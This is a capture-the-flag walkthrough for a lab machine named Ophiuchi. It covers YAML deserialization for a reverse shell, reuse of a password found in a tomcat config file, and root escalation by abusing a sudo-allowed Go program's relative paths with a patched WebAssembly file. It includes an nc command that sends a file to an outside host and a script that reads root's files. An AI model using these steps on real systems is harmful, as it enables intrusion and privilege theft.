# Ophiunchi
IP : 10.10.10.227 

nmap show us there are two ports open 

|Port|Servce|
|----|----| 
|22|ssh|
|8080|http|

The http server is a apache server with yaml parser. 
YAML is data.serialization language. It common used for configuration files and used for application for stored or transmittied. 

[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)

Has a excellence exploit for yaml 

Once I get a reverse shell as tomcat. 
time to look for a way to privilege escalation to user. 
During eom emulation I find the creditials of the user in file /opt/tomcat/conf/tomcat-users.xsd

```
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```

I can now ssh into the machine using the credientals.

## privilege escalation to root 
Frist we check what we can run as root without password. 

```
(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

Lets see what the file says:

```
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {          <==========================================
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

We can see a mistake in the programming in the code, instead for absolute path it relative path, allows us to manipulate these varibles so they can read from current working directory, from where we execute index.go. 

Lets make a tmp file and copy main.wasm and create a deploy.sh 

```
mkdir tmp

cp /opt/wasm-functions/main.wasm ./
touch deploy.sh
nano deploy.sh
```

We write to our file that echo the content for root.txt 
```
#!/bin/sh

cat /root/root.txt
```

Lets run the command and see what happens. 
... Not ready to deploy so the value of f from main.wasm is not 1.

We have to edit the main.wasm file to ensure that main.wasm output with f with 1. 

[https://github.com/webassembly/wabt](https://github.com/webassembly/wabt) 

```
sudo apt install wabt  #install the binary needed  
```

allows us to edit wasm by converting it to wat the readable format for wasm files. 

transfer the main.wasm to your own machine so we have the oppitunity to edit it. 

```
nc 10.10.14.200 5555 < main.wasm
nc -lnvp 5555 > main.wasm    
```
Convert the file to wat 
```
wasm2wat main.wasm > main.wat 
nano main.wat 
```

min.wat content. 
```
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)      <=======================================
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
```
It will never return with a value other then 0, lets change that by editing it too 1. 
```
i32.const 1) 
```

Convert back to wasm and transfer to target 
```
wat2wasm main.wat
scp main.wasm admin@ophiuchi.htb:/home/admin/tmp
```

Run the command again and get the flag. 
```
/usr/bin/go run /opt/wasm-functions/index.go
```